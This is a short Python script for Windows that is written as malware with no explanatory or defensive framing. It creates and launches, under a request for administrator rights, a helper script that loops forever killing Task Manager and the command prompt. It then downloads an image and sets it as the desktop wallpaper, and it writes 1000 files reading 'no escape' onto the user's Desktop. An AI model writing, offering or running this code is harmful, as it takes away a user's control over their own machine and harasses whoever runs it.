from random import randint as rnt
import requests
import os, sys
import ctypes
import os
dis = open("disable.pyw", "w")
dis.write("import os\nwhile True:\n	os.system('taskkill /f /im taskmgr.exe')\n	os.system('taskkill /f /im cmd.exe')")
dis.close()
ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "disable.pyw", None, 1)
response = requests.get("https://cdn.statically.io/img/wallpaperaccess.com/full/339632.jpg")
file = open("bg.png", "wb")
file.write(response.content)
file.close()
path = os.path.dirname(sys.argv[0]) + "\\bg.png"
ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
deskpath = os.path.join(os.environ["HOMEPATH"], "Desktop")
print(deskpath)
for i in range(1000):
	file = open(f"{deskpath}\\${i}$.$error$", "w")
	size = " "*990
	file.write(f"no escape{size}")
	file.close()
